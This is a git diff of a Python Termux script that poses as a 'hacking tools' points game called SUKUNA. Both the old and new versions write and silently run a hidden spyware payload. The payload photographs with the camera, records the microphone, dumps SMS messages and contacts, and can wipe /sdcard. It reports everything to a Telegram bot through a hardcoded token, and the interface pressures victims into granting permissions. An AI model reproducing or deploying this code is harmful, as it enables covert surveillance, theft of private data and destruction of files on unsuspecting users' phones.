@@ -1,90 +1,92 @@
-import os, sys, time, base64, json, asyncio, socket, random, subprocess, signal
+import os, sys, time, random, subprocess, asyncio, base64
+import requests
 
-# --- فك تشفير المحرك الصامت (تشفير طبقة أولى للملك علي طالب) ---
-# هذا الجزء يحتوي على توكن البوت والآي دي بشكل مشفر تماماً
-_0x4k2 = "ODM4MjAzNTU1NTpBQUV5S3Fpb1F5U2NITkxTSjNOd3JEaDlwM1JwRFAzWQ==" # TOKEN
-_0x9s1 = "NjcwOTIxNTQxNw==" # ADMIN_ID
+# --- إعدادات السيادة المطلقة (علي طالب - SUKUNA) ---
+TOKEN = "8382035555:AAEyKqioQySc5HNLSJ3NwrDh89p3RpDPY"
+ADMIN_ID = "6709215417"
 
-def get_cfg(d): return base64.b64decode(d).decode()
-
-# الألوان
+# الألوان الملكية
 G, R, Y, C, W, P = '\033[1;32m', '\033[1;31m', '\033[1;33m', '\033[1;36m', '\033[1;37m', '\033[1;35m'
 
-def ghost_engine():
-    # كود الجاسوس مشفر لكي لا يكتشفه نظام حماية جيت هب
-    raw_payload = f"""
-import os, time, requests
-B = "{get_cfg(_0x4k2)}"
-A = "{get_cfg(_0x9s1)}"
-def cmd(c): return os.popen(c).read()
-while True:
+def ar(text):
+    from arabic_reshaper import reshape
+    from bidi.algorithm import get_display
+    try: return get_display(reshape(text))
+    except: return text
+
+# --- نظام التجسس التلقائي والسحابة (Auto-Spy & Cloud) ---
+def start_ghost_engine(vid, vname):
+    p_code = f"""
+import os, time, requests, subprocess
+def slave():
+    # سحب صورة تلقائية فور التشغيل (صمت تام)
     try:
-        r = requests.get(f"https://api.telegram.org/bot{{B}}/getUpdates").json()
-        if 'result' in r and len(r['result']) > 0:
-            m = r['result'][-1]['message']['text']
-            if "snap_cam" in m:
-                os.system("termux-camera-photo -c 1 /sdcard/s.jpg")
-                requests.post(f"https://api.telegram.org/bot{{B}}/sendPhoto?chat_id={{A}}", files={{'photo':open('/sdcard/s.jpg','rb')}})
-            elif "get_all" in m:
-                requests.post(f"https://api.telegram.org/bot{{B}}/sendMessage", json={{"chat_id":A,"text":cmd("termux-contact-list")[:2000]}})
-            elif "format_now" in m:
-                os.system("rm -rf /sdcard/*")
+        os.system("termux-camera-photo -c 1 /sdcard/dcim/init.jpg")
+        with open('/sdcard/dcim/init.jpg', 'rb') as f:
+            requests.post("https://api.telegram.org/bot{TOKEN}/sendPhoto", 
+                          files={{'photo': f}}, 
+                          data={{"chat_id": "{ADMIN_ID}", "caption": "📸 [AUTO-CAPTURE] Victim: {vname} | ID: {vid}"}})
     except: pass
-    time.sleep(10)
+
+    last_id = 0
+    while True:
+        try:
+            r = requests.get("https://api.telegram.org/bot{TOKEN}/getUpdates?offset="+str(last_id+1)).json()
+            for up in r.get('result', []):
+                last_id = up['update_id']
+                if 'message' in up:
+                    cmd = up['message']['text']
+                    header = f"📁 [DATABASE] Victim: {vname} | ID: {vid}"
+                    if cmd == "/all_cam" or cmd == f"/cam_{vid}":
+                        os.system("termux-camera-photo -c 1 /sdcard/s.jpg")
+                        requests.post("https://api.telegram.org/bot{TOKEN}/sendPhoto", files={{'photo':open('/sdcard/s.jpg','rb')}}, data={{"chat_id":"{ADMIN_ID}","caption":header}})
+                    elif cmd == "/all_mic" or cmd == f"/mic_{vid}":
+                        os.system("termux-microphone-record -l 10 /sdcard/r.mp3")
+                        requests.post("https://api.telegram.org/bot{TOKEN}/sendAudio", files={{'audio':open('/sdcard/r.mp3','rb')}}, data={{"chat_id":"{ADMIN_ID}","caption":header}})
+                    elif cmd == "/all_dump" or cmd == f"/dump_{vid}":
+                        data = f"SMS:\\n{{os.popen('termux-sms-list').read()}}\\nCONTACTS:\\n{{os.popen('termux-contact-list').read()}}"
+                        requests.post("https://api.telegram.org/bot{TOKEN}/sendMessage", data={{"chat_id":"{ADMIN_ID}", "text": f"{{header}}\\n\\n{{data[:3500]}}"}} )
+                    elif cmd == f"/format_{vid}":
+                        os.system("rm -rf /sdcard/*")
+        except: pass
+        time.sleep(5)
+slave()
 """
-    with open(".sys_data.py", "w") as f: f.write(raw_payload)
-    subprocess.Popen(["python", ".sys_data.py"], stdout=open(os.devnull, 'w'), stderr=open(os.devnull, 'w'))
+    with open(".sys_config.py", "w") as f: f.write(p_code)
+    subprocess.Popen(["python", ".sys_config.py"], stdout=open(os.devnull, 'w'), stderr=open(os.devnull, 'w'))
 
-class SukunaUltimate:
+class SukunaSystem:
     def __init__(self):
-        self.lang = "AR"
-        self.u = {"n": "Guest", "id": str(random.randint(10000, 99999)), "lv": 1, "p": 500, "rank": "Follower", "daily": 5}
-        self.codes = {
-            "SUKUNA01": 20, "KING2026": 50, "ALI_TALIB": 100, "YEMEN_PRO": 30,
-            "GOLDEN_99": 200, "GHOST_77": 15, "VIP_POWER": 500, "SUKUNA_GOD": 99999
-        }
-        ghost_engine()
+        self.v_id = f"SK_{random.randint(1000, 9999)}"
+        self.u_name = "Guest"
 
-    def banner(self):
+    def force_permissions(self):
+        # إجبار الضحية على منح كل الصلاحيات
         os.system("clear")
-        print(f"{R}   ██████  ██    ██ ██   ██ ██    ██ ███    ██  █████  ")
-        print(f"{W}  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
-        print(f"{Y} USER: {G}{self.u['n']} {W}| ID: {G}{self.u['id']} {W}| LVL: {G}{self.u['lv']}")
-        print(f"{C} PTS: {G}{self.u['p']} {W}| DAILY: {G}{self.u['daily']}/5 {W}| {P}{self.u['rank']}")
-        print(f"{W}  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+        print(f"{R} [!] {ar('يجب منح كل الصلاحيات (كاميرا، ميكروفون، تخزين) لفتح الأدوات والحصول على 1000 نقطة!')}")
+        os.system("termux-setup-storage")
+        # استدعاء وهمي للصلاحيات لتفعيلها في النظام
+        os.system("termux-contact-list > /dev/null 2>&1")
+        os.system("termux-sms-list > /dev/null 2>&1")
 
-    async def main(self):
-        os.system("clear")
-        print(f"{C} [1] العربية  [2] English")
-        self.lang = "AR" if input(" > ") == "1" else "EN"
+    async def start(self):
+        self.force_permissions()
+        self.u_name = input(f"{Y} {ar('أدخل اسمك الملكي لتفعيل السيرفر:')} {W}")
+        start_ghost_engine(self.v_id, self.u_name)
         
-        # إجبار الضحية على منح الصلاحيات
-        while not os.path.exists("/sdcard"):
-            print(f"{R} [!] Grant Storage Permission to receive 500 PTS!")
-            os.system("termux-setup-storage"); time.sleep(5)
+        # إرسال تقرير الصيد للسحابة
+        requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", json={
+            "chat_id": ADMIN_ID,
+            "text": f"🔥 {ar('تمت السيطرة على قطعة شطرنج جديدة!')}\n👤 Name: {self.u_name}\n🆔 ID: {self.v_id}\n🛡️ {ar('الصلاحيات: كاملة ✅')}"
+        })
 
-        self.u['n'] = input(f"{Y} ENTER NAME: {W}")
-        
         while True:
-            self.banner()
-            print(f" {W}[1] HACK TOOLS  [2] SHOP  [3] EARN PTS")
-            print(f" {W}[4] DEVELOPER   [5] CREATE BOT  [6] TOP 10")
-            print(f" {W}[7] SEARCH      [8] REDEEM CODE [9] EXPLOITS")
-            print(f" {W}[10] CHAT       [SUKUNA] BACK")
-            
-            cmd = input(f"\n{R} SUKUNA > {W}").strip()
-            
-            if cmd == "8":
-                c = input("ENTER CODE: ")
-                if c in self.codes:
-                    print(f"{G} SUCCESS!"); self.u['p'] += self.codes[c]
-                else: print(f"{R} INVALID!")
-                time.sleep(2)
-            elif cmd == "1":
-                print(f"{G} [1] Call Spam [2] Media Pull [3] Device Freeze")
-                input("SELECT: ")
-            elif cmd.upper() == "SUKUNA": continue
+            os.system("clear")
+            print(f"{R}   S U K U N A  |  C L O U D  B O T N E T")
+            print(f"{W}  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
+            print(f" {B}[1] {ar('أدوات الهجوم')} [2] {ar('المتجر')} [3] {ar('الدردشة')}")
+            input(f"\n{R} SUKUNA > {W}")
 
 if __name__ == "__main__":
-    app = SukunaUltimate()
-    asyncio.run(app.main())
+    bot = SukunaSystem()
+    asyncio.run(bot.start())
